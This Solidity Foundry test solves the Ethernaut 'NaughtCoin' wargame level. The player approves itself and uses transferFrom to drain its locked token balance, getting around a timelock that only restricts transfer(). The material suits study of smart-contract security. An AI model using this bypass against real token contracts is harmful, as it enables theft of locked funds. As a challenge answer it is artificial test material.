// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../../src/levels/15-NaughtCoin/NaughtCoinFactory.sol";
import "../../../src/core/Ethernaut.sol";

contract NaughtCoinTest is Test {
    Ethernaut ethernaut;
    address attacker = address(0xabcd);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testNaughtCoinHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        NaughtCoinFactory naughtFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(naughtFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        uint256 attackerBal = ethernautNaughtCoin.balanceOf(attacker);

        ethernautNaughtCoin.approve(attacker, attackerBal);
        ethernautNaughtCoin.transferFrom(attacker, address(this), attackerBal);

        assertEq(ethernautNaughtCoin.balanceOf(attacker), 0);
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
